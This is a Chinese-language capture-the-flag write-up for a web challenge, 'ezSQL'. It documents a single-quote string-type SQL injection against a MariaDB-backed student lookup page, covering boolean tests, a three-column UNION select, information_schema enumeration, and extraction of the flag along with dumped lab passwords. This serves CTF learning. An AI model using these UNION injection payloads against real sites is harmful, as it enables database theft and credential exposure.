# ezSQL — WriteUp

| 项目 | 内容 |
|---|---|
| 分类 | Web / SQL 注入（MariaDB，字符型 + UNION 回显） |
| 分值 | 525（动态分值） |
| 类型 | DynamicContainer |
| 入口 | `http://103.163.47.230:34413`（赛后已释放） |
| Flag | `HTUCTF{90d3ce55-649b-472f-8506-db43687d0b75}` |
| 提交记录 | 1 次，submitId 4732，Accepted |
| 复现脚本 | `probe.py`（注入点判定）、`probe2.py`（DBMS 指纹）、`probe3.py`（表/列枚举）、`dump.py`（一键 dump flag） |

## 1. 入口

一个「教务系统 · 学生信息查询」页面，`GET /?id=1` 返回学号/姓名/密码三列：

```
学号 1 | 林深 | Passw0rd!23
```

`id=2`、`id=3` 分别返回周遥、陈屿；`id=999` 返回空表（页面缩到 708 字节），说明参数确实进了 SQL。

## 2. 注入类型判定

| payload | 结果 | 结论 |
|---|---|---|
| `1 and 1=1` / `1 and 1=2` | 都返回 id=1 | 数值型无效 |
| `1' and '1'='1` | 正常返回 | **字符型（单引号）** |
| `1' and '1'='2` | 空表 | 布尔 oracle 成立 |
| `1' union select 1,2,3-- -` | 三行 `1 / 2 / 3` | **3 列、UNION 回显** |
| `1 union select 1,2,3`（不带引号） | 无变化 | 再次确认必须闭合单引号 |

## 3. 指纹

```
-1' union select 1,version(),3-- -        -> 10.11.19-MariaDB-ubu2204
-1' union select 1,database(),3-- -       -> htu-ctf
-1' union select 1,current_user(),3-- -   -> app@localhost
-1' union select 1,group_concat(table_name),3 from information_schema.tables-- -
    -> ... ,teacher,student,flag
```

## 4. 拿 flag

`flag` 表的列名带连字符（`flag-value`），必须用反引号包起来：

```
-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='flag'-- -
    -> id,key,flag-value

-1' union select 1,(select group_concat(`flag-value`) from flag),3-- -
    -> HTUCTF{90d3ce55-649b-472f-8506-db43687d0b75}
```

顺手 dump 出来的其它表（对 flag 无用，仅记录）：

```
teacher: 1 周明 Teach@2026 / 2 陈静 Grace#123 / 3 苏婉（密码被截断）
student: 1 林深 Passw0rd!23 / 2 周遥 Qwerty2026 / 3 陈屿 Chen@1234
```

## 5. 一句话总结

无过滤的单引号字符型注入，3 列 UNION 回显，直接读 `htu-ctf.flag` 表即可。
